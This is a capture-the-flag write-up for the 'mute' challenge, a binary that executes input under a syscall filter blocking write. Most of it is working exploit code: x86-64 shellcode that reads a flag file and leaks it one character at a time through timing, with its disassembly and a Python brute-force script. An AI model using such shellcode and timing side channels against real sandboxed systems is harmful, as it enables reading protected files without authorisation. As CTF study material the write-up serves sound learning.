# Writeup
The challenge gives the mute executable and that's all.
Doing a reverse engineer with IDA, we can note two things:

1- There is a function dropSyscalls which drops every syscalls, except 0x0, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc and 0x3b.
This means that the syscall 0x1 (write) is forbiden and we cannot write to stdout.

![mute2](https://cloud.githubusercontent.com/assets/1280700/25589772/45f41628-2e84-11e7-98f7-7d6f808be792.png)

2- The executable just reads some bytes from stdin (lines 15-20) and executes it (line 21).

![mute1](https://cloud.githubusercontent.com/assets/1280700/25589768/42ff307e-2e84-11e7-81ac-f932461b2bd7.png)

After noticing that, the first thing that came to my mind was to send a shellcode which reads the flag (I assumed it was
in /home/mute/flag) and does a time-based blind attack. The code tries to guess a character position of the flag. If it
is correct, them takes some time (looping) before exiting. If it is incorrect, it just exits imediately. Actually, the exit
syscall is forbidden, but it does not metter for us because we are only interested in the timing.

```assembly
section .text
    global _start

_start:
;/home/mute/flag
mov r8, 0x67616c662f6574
push r8
mov r8, 0x756d2f656d6f682f
push r8

; syscall open file
mov rdi, rsp ; pop path value
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
cmp byte [rsi + 1], 0x69
jne exit

;guessed correct? sleep
mov ecx,0
loop1:

inc ecx
cmp ecx, 0xffffffff
jne loop1

mov ecx,0
loop2:

inc ecx
cmp ecx, 0xffffffff
jne loop2

; syscall exit
exit:
xor rax, rax
add al, 60
syscall
```

And the objdump:

```
$ nasm -f elf64 shell.asm ; ld -o shell shell.o; objdump -d shell

shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	49 b8 74 65 2f 66 6c 	movabs $0x67616c662f6574,%r8
  400087:	61 67 00 
  40008a:	41 50                	push   %r8
  40008c:	49 b8 2f 68 6f 6d 65 	movabs $0x756d2f656d6f682f,%r8
  400093:	2f 6d 75 
  400096:	41 50                	push   %r8
  400098:	48 89 e7             	mov    %rsp,%rdi
  40009b:	48 31 c0             	xor    %rax,%rax
  40009e:	04 02                	add    $0x2,%al
  4000a0:	48 31 f6             	xor    %rsi,%rsi
  4000a3:	0f 05                	syscall 
  4000a5:	66 81 ec ff 0f       	sub    $0xfff,%sp
  4000aa:	48 8d 34 24          	lea    (%rsp),%rsi
  4000ae:	48 89 c7             	mov    %rax,%rdi
  4000b1:	48 31 d2             	xor    %rdx,%rdx
  4000b4:	66 ba ff 0f          	mov    $0xfff,%dx
  4000b8:	48 31 c0             	xor    %rax,%rax
  4000bb:	0f 05                	syscall 
  4000bd:	80 7e 01 69          	cmpb   $0x69,0x1(%rsi)
  4000c1:	75 18                	jne    4000db <exit>
  4000c3:	b9 00 00 00 00       	mov    $0x0,%ecx

00000000004000c8 <loop1>:
  4000c8:	ff c1                	inc    %ecx
  4000ca:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4000cd:	75 f9                	jne    4000c8 <loop1>
  4000cf:	b9 00 00 00 00       	mov    $0x0,%ecx

00000000004000d4 <loop2>:
  4000d4:	ff c1                	inc    %ecx
  4000d6:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4000d9:	75 f9                	jne    4000d4 <loop2>

00000000004000db <exit>:
  4000db:	48 31 c0             	xor    %rax,%rax
  4000de:	04 3c                	add    $0x3c,%al
  4000e0:	0f 05                	syscall
```

Taking the bytes of this shellcode, I made a python script to do this blind attack. The script sends the same bytes of 
the shellcode above, but replacing the corresponding guessing position and character (*cmp byte [rsi + 1], 0x69*).

```python
from pwn import *
import string
from datetime import datetime
import os

context.log_level = 'error'

shell = "\\x49\\xb8\\x74\\x65\\x2f\\x66\\x6c\\x61\\x67\\x00\\x41\\x50\\x49\\xb8\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x6d\\x75\\x41\\x50\\x48\\x89\\xe7\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x80\\x7e\\x01\\x68\\x75\\x18\\xb9\\x00\\x00\\x00\\x00\\xff\\xc1\\x83\\xf9\\xff\\x75\\xf9\\xb9\\x00\\x00\\x00\\x00\\xff\\xc1\\x83\\xf9\\xff\\x75\\xf9\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05"

flag = ""
i = 1

while True:
    for c in string.printable:
        try:
            current_shell = shell.replace("\\x01\\x68", "\\x" + chr(i).encode("hex") + "\\x" + c.encode("hex"))
            start = datetime.now()
            os.popen("python -c 'print(\"" + current_shell + "\" + \"\\x00\"*4009)' | ./mute") # nc mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443
            total = (datetime.now() - start).seconds
            if total >= 2:
                i += 1
                flag += c
                print("FOUND!!!!!")
                print(flag)
        except:
            pass
```

Locally it worked fine! Now it was time to try remotely. However, it was missing just about 10 minutes for the end of the competition.
Although I did not submit the flag in time, I consider that I solved this challenge. I took a look at this challenge just 2 
hours before the end of the competition and when I was with about half of the flag, the time went over and the server came 
down :(
**The flag is: I tXXXXXXXXXat I'd do was, I'd pXXXXXX**

where **X** are the missing characters. It may have some wrong characters because of wrong estimation of time, but nothing that a double check could not solve.

